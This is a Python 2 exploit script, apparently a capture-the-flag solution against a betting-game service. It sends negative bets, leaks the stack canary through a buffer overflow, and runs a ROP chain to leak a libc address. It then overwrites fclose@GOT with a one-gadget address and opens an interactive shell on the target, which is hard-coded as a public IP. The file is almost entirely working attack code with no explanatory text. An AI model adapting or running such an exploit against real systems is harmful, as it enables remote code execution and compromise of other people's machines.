import struct
import telnetlib
import time
from socket import *

p4 = lambda x : struct.pack("<L", x)
p8 = lambda x : struct.pack("<Q", x)
up4 = lambda x : struct.unpack("<L", x)[0]
up8 = lambda x : struct.unpack("<Q", x)[0]

def ReadUntil(s, chkStr) :
    data = s.recv(len(chkStr))
    while not data.endswith(chkStr) :
        tmp = s.recv(1)
        if not tmp: break
        data += tmp

    return data

local = 1
if local == 1:
    HOST = "127.0.0.1"
    PORT = 3131
else :
    HOST = "52.34.185.58"
    PORT = 10001 # I forgot the port number

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))

#explot!

# betmoney
print ReadUntil(s, ">>> ")
s.send("1\n")
ReadUntil(s, ": ")
s.send("-31337\n")
ReadUntil(s, ": ")
s.send("-31337\n")
print ReadUntil(s, ">>> ")

# getreward for canary
s.send("3\n")
ReadUntil(s, ": ")
s.send('A' * 0x28 + '\n')
data = ReadUntil(s, ">>> ")

idx = data.find('AAAA') + 0x28
canary = data[idx:idx+8]
print '[*] canary ', hex(up8(canary))

# getreward for exploit
s.send("3\n")
ReadUntil(s, ": ")

popRdiRet = 0x401083
putsGot = 0x602018
puts = 0x4008C0
fcloseGot = 0x602030
gets = 0x4009A0
fclose = 0x4008f0

s.send('A'*0x28 + canary + 'B'*8 + p8(popRdiRet) + p8(putsGot) + p8(puts) + p8(popRdiRet) + p8(fcloseGot) + p8(gets) + p8(fclose) + '\n')

# get address of puts function in libc
data = ReadUntil(s, '\x7f')
leaklibc = up8(data[-6:]+'\x00\x00')
print '[*] libc ', hex(leaklibc)

# calculate oneshot code range
if local == 1:
    oneshot = leaklibc - 0x283d6 #(0x00007f60aec8d7f0 - 0x00007f60aec6541a)
else:
    oneshot = leaklibc - 0x298e4

# overwrite fclose@got
s.send(p8(oneshot) + '\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
